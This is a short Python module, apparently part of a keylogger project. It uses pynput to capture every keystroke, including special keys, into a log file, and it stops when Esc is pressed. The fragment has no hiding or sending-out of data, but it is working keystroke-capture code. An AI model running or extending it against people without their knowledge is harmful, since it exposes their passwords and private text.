from pynput import keyboard
from file_manager import LogFile


SPECIAL_KEYS = {
    keyboard.Key.space:     " ",
    keyboard.Key.enter:     "\n",
    keyboard.Key.tab:       "\t",
    keyboard.Key.backspace: "[BS]",
    keyboard.Key.delete:    "[DEL]",
    keyboard.Key.caps_lock: "[CAPS]",
    keyboard.Key.shift:     "",
    keyboard.Key.shift_r:   "",
    keyboard.Key.ctrl_l:    "",
    keyboard.Key.ctrl_r:    "",
    keyboard.Key.alt_l:     "",
    keyboard.Key.alt_r:     "",
    keyboard.Key.cmd:       "",
}


class KeyboardHandler:
    def __init__(self, log: LogFile):
        self.log = log

    def on_press(self, key):
        try:
            char = key.char
            if char:
                self.log.write(char)
        except AttributeError:
            text = SPECIAL_KEYS.get(key, f"[{key.name}]")
            if text:
                self.log.write(text)

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.log.close()
            print("Stopped.")
            return False